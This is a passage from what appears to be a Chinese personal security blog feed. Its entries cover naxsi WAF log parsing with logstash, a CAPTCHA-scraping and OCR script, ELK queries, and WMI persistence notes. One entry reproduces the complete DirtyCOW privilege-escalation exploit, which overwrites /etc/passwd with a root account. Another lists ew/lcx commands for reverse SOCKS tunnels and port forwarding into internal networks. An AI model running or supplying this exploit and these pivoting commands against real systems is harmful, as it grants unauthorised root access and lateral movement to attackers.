%&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p><pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grokbin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后配置<code>/etc/logstash.conf</code>文件：</p><pre class="line-numbers language-none"><code class="language-none">input&#123;     file &#123;       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;       type &#x3D;&gt; &quot;naxsi-error&quot;       start_position &#x3D;&gt; &quot;beginning&quot;   &#125;&#125;filter&#123;     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;grok &#123;patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;]       &#125;ruby &#123;code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;    &#125;&#125;&#125;output&#123;      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;elasticsearch &#123;   hosts &#x3D;&gt; [&quot;localhost&quot;]   index &#x3D;&gt; &quot;nxapi&quot;           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;&#125;stdout &#123; codec &#x3D;&gt; rubydebug&#125;     &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置好之后，启动logstash，这样对于同一次拦截会产生两条elk的日志，其中日志的document_id，前缀是请求的id和时间计算的hash，类似这样：</p><pre class="line-numbers language-none"><code class="language-none">e0737c661e5e3457fbc3d847f75817fa_NAXSI_FMTe0737c661e5e3457fbc3d847f75817fa_NAXSI_EXLOG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在线调试正则: <a href="https://grokdebug.herokuapp.com/">https://grokdebug.herokuapp.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>验证码识别</title>
      <link href="/2017/09/26/VerifyCode.html"/>
      <url>/2017/09/26/VerifyCode.html</url>
      
        <content type="html"><![CDATA[<p>先灰度处理</p><pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后是二值化, 二值化处理之后，投影</p><p>以预发布为例子，获取验证的url: <a href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;for i in range(20):imgfile &#x3D; str(i) + &#39;.jpg&#39;req &#x3D; requests.get(url)image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p><p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p><p>我们这里使用8邻域算法。</p><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8from PIL import Imageimport osimport reimport pytesseractdef binarizing(img, threshold):   img &#x3D; img.convert(&quot;L&quot;)   pixdata &#x3D; img.load()   w, h &#x3D; img.size   for y in range(h):      for x in range(w):         if pixdata[x, y] &lt; threshold:            pixdata[x, y] &#x3D; 0         else:            pixdata[x, y] &#x3D; 255   return img   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)def depoint(img):   pixdata &#x3D; img.load()   w,h &#x3D; img.size   for y in range(1,h-1):      for x in range(1, w-1):         count &#x3D; 0         if pixdata[x, y-1] &gt; 245:            count &#x3D; count + 1         if pixdata[x, y+1] &gt; 245:            count &#x3D; count + 1         if pixdata[x-1, y] &gt; 245:            count &#x3D; count + 1         if pixdata[x+1, y] &gt; 245:            count &#x3D; count + 1         if pixdata[x-1, y-1] &gt; 245:            count &#x3D; count + 1         if pixdata[x-1, y+1] &gt; 245:            count &#x3D; count + 1         if pixdata[x+1, y-1] &gt; 245:            count &#x3D; count + 1         if pixdata[x+1, y+1] &gt; 245:            count &#x3D; count + 1         if count &gt; 4:            pixdata[x, y] &#x3D; 255   return imgpath &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)images &#x3D; os.listdir(path)for image in images:   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)      b_img &#x3D; binarizing(img, 230)      v &#x3D; depoint(b_img)      vcode &#x3D; pytesseract.image_to_string(v)      matches &#x3D; re.findall(pattern, vcode)      filename &#x3D; &#39;&#39;.join(map(str, matches))      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C0w</title>
      <link href="/2017/09/12/c0w.html"/>
      <url>/2017/09/12/c0w.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p><pre class="line-numbers language-none"><code class="language-none">Compile with:&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt&#x2F;&#x2F;&#x2F;&#x2F; Then run the newly create binary by either doing:&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;&#x2F;&#x2F;&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;&#x2F;&#x2F;&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability&#x2F;&#x2F; as a base and automatically generates a new passwd line.&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak&#x2F;&#x2F; and overwrites the root account with the generated line.&#x2F;&#x2F; After running the exploit you should be able to login with the newly&#x2F;&#x2F; created user.&#x2F;&#x2F;&#x2F;&#x2F; To use this exploit modify the user values according to your needs.&#x2F;&#x2F;   The default is &quot;firefart&quot;.&#x2F;&#x2F;&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c&#x2F;&#x2F;&#x2F;&#x2F; Compile with:&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt&#x2F;&#x2F;&#x2F;&#x2F; Then run the newly create binary by either doing:&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;&#x2F;&#x2F;&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;&#x2F;&#x2F;&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd&#x2F;&#x2F;&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at&#x2F;&#x2F;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;sys&#x2F;mman.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;sys&#x2F;stat.h&gt;#include &lt;sys&#x2F;wait.h&gt;#include &lt;sys&#x2F;ptrace.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;crypt.h&gt;const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;const char *salt &#x3D; &quot;firefart&quot;;int f;void *map;pid_t pid;pthread_t pth;struct stat st;struct Userinfo &#123;   char *username;   char *hash;   int user_id;   int group_id;   char *info;   char *home_dir;   char *shell;&#125;;char *generate_password_hash(char *plaintext_pw) &#123;  return crypt(plaintext_pw, salt);&#125;char *generate_passwd_line(struct Userinfo u) &#123;  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,    u.user_id, u.group_id, u.info, u.home_dir, u.shell);  char *ret &#x3D; malloc(size + 1);  sprintf(ret, format, u.username, u.hash, u.user_id,    u.group_id, u.info, u.home_dir, u.shell);  return ret;&#125;void *madviseThread(void *arg) &#123;  int i, c &#x3D; 0;  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;    c +&#x3D; madvise(map, 100, MADV_DONTNEED);  &#125;  printf(&quot;madvise %d\n\n&quot;, c);&#125;int copy_file(const char *from, const char *to) &#123;  &#x2F;&#x2F; check if target file already exists  if(access(to, F_OK) !&#x3D; -1) &#123;    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,      to);    return -1;  &#125;  char ch;  FILE *source, *target;  source &#x3D; fopen(from, &quot;r&quot;);  if(source &#x3D;&#x3D; NULL) &#123;    return -1;  &#125;  target &#x3D; fopen(to, &quot;w&quot;);  if(target &#x3D;&#x3D; NULL) &#123;     fclose(source);     return -1;  &#125;  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;     fputc(ch, target);   &#125;  printf(&quot;%s successfully backed up to %s\n&quot;,    from, to);  fclose(source);  fclose(target);  return 0;&#125;int main(int argc, char *argv[])&#123;  &#x2F;&#x2F; backup file  int ret &#x3D; copy_file(filename, backup_filename);  if (ret !&#x3D; 0) &#123;    exit(ret);  &#125;  struct Userinfo user;  &#x2F;&#x2F; set values, change as needed  user.username &#x3D; &quot;firefart&quot;;  user.user_id &#x3D; 0;  user.group_id &#x3D; 0;  user.info &#x3D; &quot;pwned&quot;;  user.home_dir &#x3D; &quot;&#x2F;root&quot;;  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;  char *plaintext_pw;  if (argc &gt;&#x3D; 2) &#123;    plaintext_pw &#x3D; argv[1];    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);  &#125; else &#123;    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);  &#125;  user.hash &#x3D; generate_password_hash(plaintext_pw);  char *complete_passwd_line &#x3D; generate_passwd_line(user);  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);  f &#x3D; open(filename, O_RDONLY);  fstat(f, &amp;st);  map &#x3D; mmap(NULL,             st.st_size + sizeof(long),             PROT_READ,             MAP_PRIVATE,             f,             0);  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);  pid &#x3D; fork();  if(pid) &#123;    waitpid(pid, NULL, 0);    int u, i, o, c &#x3D; 0;    int l&#x3D;strlen(complete_passwd_line);    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;      for(o &#x3D; 0; o &lt; l; o++) &#123;        for(u &#x3D; 0; u &lt; 10000; u++) &#123;          c +&#x3D; ptrace(PTRACE_POKETEXT,                      pid,                      map + o,                      *((long*)(complete_passwd_line + o)));        &#125;      &#125;    &#125;    printf(&quot;ptrace %d\n&quot;,c);  &#125;  else &#123;    pthread_create(&amp;pth,                   NULL,                   madviseThread,                   NULL);    ptrace(PTRACE_TRACEME);    kill(getpid(), SIGSTOP);    pthread_join(pth,NULL);  &#125;  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,    user.username, plaintext_pw);    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,    backup_filename, filename);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>elk操作相关</title>
      <link href="/2017/08/15/elk_basic.html"/>
      <url>/2017/08/15/elk_basic.html</url>
      
        <content type="html"><![CDATA[<p> kibana里面开始添加index的时候，先查看es的索引:</p><p> <code>curl &#39;localhost:9200/_cat/indices?v&#39;</code></p><p> 然后添加的时候直接写索引名字就行了。</p><p> 在kibana里面添加filter:</p><h3 id="搜索近三天的数据"><a href="#搜索近三天的数据" class="headerlink" title="搜索近三天的数据:"></a>搜索近三天的数据:</h3><pre class="line-numbers language-none"><code class="language-none">  &#123;  &quot;query&quot;: &#123;    &quot;range&quot;: &#123;      &quot;@timestamp&quot;: &#123;        &quot;gt&quot;: &quot;now-3d&quot;      &#125;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="搜索某一天的数据"><a href="#搜索某一天的数据" class="headerlink" title="搜索某一天的数据:"></a>搜索某一天的数据:</h3><pre class="line-numbers language-none"><code class="language-none"> &#123;  &quot;query&quot;: &#123;    &quot;range&quot;: &#123;      &quot;@timestamp&quot;: &#123;        &quot;gt&quot;: &quot;2017-08-15T01:00:00.900&quot;,        &quot;lt&quot;: &quot;2017-08-15T23:59:00.900&quot;      &#125;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 在kibana里面的Dev Tools可以直接操作es数据库:</p><h3 id="查询数据库某一天的数据"><a href="#查询数据库某一天的数据" class="headerlink" title="查询数据库某一天的数据:"></a>查询数据库某一天的数据:</h3><pre class="line-numbers language-none"><code class="language-none">  GET [index]&#x2F;_search&#123;  &quot;query&quot;: &#123;    &quot;range&quot;: &#123;      &quot;@timestamp&quot;: &#123;        &quot;gt&quot;: &quot;2017-08-15T01:00:00.900&quot;,        &quot;lt&quot;: &quot;2017-08-15T23:59:00.900&quot;      &#125;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="根据查询删除某一天的数据"><a href="#根据查询删除某一天的数据" class="headerlink" title="根据查询删除某一天的数据:"></a>根据查询删除某一天的数据:</h3><pre class="line-numbers language-none"><code class="language-none">POST assets&#x2F;_delete_by_query&#123;  &quot;query&quot;: &#123;    &quot;range&quot;: &#123;      &quot;@timestamp&quot;: &#123;        &quot;lt&quot;: &quot;2017-08-10T23:59:00.900&quot;      &#125;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除12小时之前的所有数据:</p><pre class="line-numbers language-none"><code class="language-none">curl -XPOST &quot;http:&#x2F;&#x2F;localhost:9200&#x2F;assets&#x2F;_delete_by_query&quot; -H &#39;Content-Type: application&#x2F;json&#39; -d&#39;&#123; &quot;query&quot;: &#123; &quot;range&quot;: &#123; &quot;@timestamp&quot;: &#123; &quot;lt&quot;: &quot;now-12h&quot; &#125; &#125; &#125; &#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="logstash"><a href="#logstash" class="headerlink" title="logstash"></a>logstash</h3><p>在使用grok处理json格式的数据的时候，匹配是这样的:</p><pre class="line-numbers language-none"><code class="language-none">grok &#123;        match &#x3D;&gt; [              &quot;[http][request][body]&quot;,  &quot;(?&lt;waf&gt;(?i)(.*)union(.*))&quot;        ]      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ew端口转发与SOCKS5代理</title>
      <link href="/2017/08/12/ew-slave.html"/>
      <url>/2017/08/12/ew-slave.html</url>
      
        <content type="html"><![CDATA[<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>首先第一点: 端口转发和socks代理两个是不一样的东西。</p><p>根据<a href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>里面提到的端口转发工具有三种工作状态:</p><ul><li>slave 客户端接客户端      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li><li>tran  服务端接客户端      -tran  ConnectPort TransmitHost TransmitPort</li><li>listen 服务端接服务端     -listen ConnectPort TransmitPort</li></ul><p>再来个例子<a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;目标机器的所有数据转发到公网vps的9000端口lcx.exe -listen 9000 5555   &#x2F;&#x2F;将本机9000端口监听的数据转发到本机5555端口通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面两个对应的ew是这么写的：</p><pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000第一个靶机可以抓发vps访问不到的ip，比如linux的22端口，也就是把这个机子作为跳板。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><ul><li>如果目标有公网IP:</li></ul><p><code>ew.exe -s ssocksd -l 1080</code>  即可将其作为代理</p><ul><li>如果没有公网IP，但是可以访问公网</li></ul><pre class="line-numbers language-none"><code class="language-none">首先在公网IP运行:ew -s rcsocks -l 1080 -e 8888然后在目标主机运行反弹:ew -s rssocks -d 45.x.x.x.x -e 8888然后就可以以公网的1080作为代理进入内网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是最简单最基本的应用,二级和三级的链接可以看下面的文章：<br><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p><p>其实上面的文章简单总结下就是ew官网写的那几条命令</p><h4 id="二级级联"><a href="#二级级联" class="headerlink" title="二级级联"></a>二级级联</h4><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 9999    &#x2F;&#x2F;在B上面开一个9999的socks代理ew -s lcx_tran -l 1080 -f x.x.x.x -g 9999 &#x2F;&#x2F;在具有公网IP的主机上连接B开了代理的机子<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果x.x.x.x没有公网IP，但是可以连通公网IP，就需要以下的步骤</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 1080 -e 8888 &#x2F;&#x2F;vps运行，把1080接受到的数据发送给8888ew -s ssocksd -l 9999 &#x2F;&#x2F;可以接触核心网络的C主机上面开一个9999端口的代理接下来就是中间的B主机连接vps和C主机ew -s lcx_slave -d VPS的IP -e 8888 -f C的IP -g 9999至此，隧道打通<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后来一个复杂的三级网络:<br>先说下最简单的反代，前面说过:</p><pre class="line-numbers language-none"><code class="language-none">首先在公网IP运行:ew -s rcsocks -l 1080 -e 8888然后在目标主机运行反弹:ew -s rssocks -d 45.x.x.x.x -e 8888然后就可以以公网的1080作为代理进入内网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>复杂的三级就是在这两个主机之间加了两个主机</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 8888 &#x2F;&#x2F;把1080端口收到的请求转给8888端口ew -s lcx_slave -d 43.x.x.x -e 8888 -f 10.x.x.x -g 9999ew -s lcx_listen -l 9999 -e 7777ew -s rssocks -d 11.x.x.x 7777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WMI学习笔记</title>
      <link href="/2017/07/12/wmi.html"/>
      <url>/2017/07/12/wmi.html</url>
      
        <content type="html"><![CDATA[<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote><p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p></blockquote><h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p><p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p><p><a href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p><p>可以调用wmi的方式或者语言:</p><pre class="line-numbers language-none"><code class="language-none">* wmic.exe* winrm.exe* winrs.exe* powershell* windows scripting host(WSH)   * VBScript   * JScript* mof* C&#x2F;C++ via IWbem* COM API* .NET System.Management classes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p><h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3><p>WSH常用的对象：</p><p>####WScript<br>windows脚本宿主对象模型的根对象，它能提供多个子对象，比如Wscript.Arguments和Wscript.shell，前者提供对整个命令行参数集的访问，后者可以运行程序，操作注册表，创建快捷方式或访问系统文件夹。<br>####Scripting.FileSystemObject<br>主要为IIS设计的对象，访问文件系统，几乎所有的windows脚本病毒通过它复制自己感染别人。<br>####ADODB.Stream<br>ActiveX Data Objects数据库的字对象，提供流方式访问文件的功能。<br>####microsoft.XMLHTP<br>为了支持XML而设计的对象，通过http协议访问网络，常用户跨站脚本执行漏洞和SQL Injection<br>####ADSI(活动目录服务接口，主要用于windows域管理)<br>####WBEM对象，wmi服务提供该对象的接口</p><pre class="line-numbers language-none"><code class="language-none">strComputer &#x3D; &quot;.&quot;Set objWMIService &#x3D; GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\default&quot;)Set colEvents &#x3D; objWMIService.ExecNotificationQuery _    (&quot;SELECT * FROM RegistryKeyChangeEvent WHERE Hive&#x3D;&#39;HKEY_LOCAL_MACHINE&#39; AND &quot; &amp; _        &quot;KeyPath&#x3D;&#39;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&#39;&quot;) Do    Set objLatestEvent &#x3D; colEvents.NextEvent    Wscript.Echo Now &amp; &quot;: The registry has been modified.&quot;Loop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下例子：vbs脚本操作wmi对象的时候，有两种方法<code>winmgmts:\\</code>和<code>WbemScripting.SWBemlocator</code></p><blockquote><p>not only throuth an SWbemLocator object, but also through the moniker “winmgmts:”. A moniker is a short name that locate a namespace、class or instance in WMI. The name “winmgmts:” is the WMI moniker that tell the Windows Script Host to use the WMI objects, connects to the default namespace, and obtains an SWbemServices object.</p></blockquote><p>不过这两者是有异同的，SWbemlocator可以做到WMI moniker不能做到的两个功能（SWbemlocator is designed to address two specific scripting scenarios that cannot be performed using GetObject and the WMI moniker， You must use SWbemLocator if you need to)：</p><ol><li>provide user and password credentials to connect to WMI on a remote computer. The WMI moniker used with the GetObject function does not include a 